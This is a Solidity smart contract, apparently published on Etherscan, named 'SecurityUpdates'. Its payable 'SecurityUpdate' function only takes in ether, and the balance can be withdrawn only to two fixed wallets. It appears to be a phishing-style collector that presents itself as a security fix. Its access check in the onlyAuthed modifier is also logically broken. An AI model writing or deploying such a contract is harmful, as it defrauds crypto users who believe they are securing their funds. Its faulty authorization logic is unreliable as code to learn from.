/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.17;

contract SecurityUpdates {

    address public wallet0;
    address public wallet1;

    constructor(address _w0, address _w1) {
        wallet0 = _w0;
        wallet1 = _w1;
    }

    function SecurityUpdate() public payable {}

    error Unauthorized();
    error WithdrawalError();

    modifier onlyAuthed {
        if (msg.sender != wallet0 || msg.sender != wallet1) revert Unauthorized();
        _;
    }

    function changeWallet(address _new) public onlyAuthed {
        if (msg.sender == wallet0) {
            wallet0 = _new;
        } else if (msg.sender == wallet1) {
            wallet1 = _new;
        } else {
            revert Unauthorized();
        }
    }

    function withdraw() public onlyAuthed {
        uint each = address(this).balance/2;
        (bool ok0, ) = payable(wallet0).call{value: each}("");
        (bool ok1, ) = payable(wallet1).call{value: each}("");
        if (!ok0 || !ok1) revert WithdrawalError();
    }
}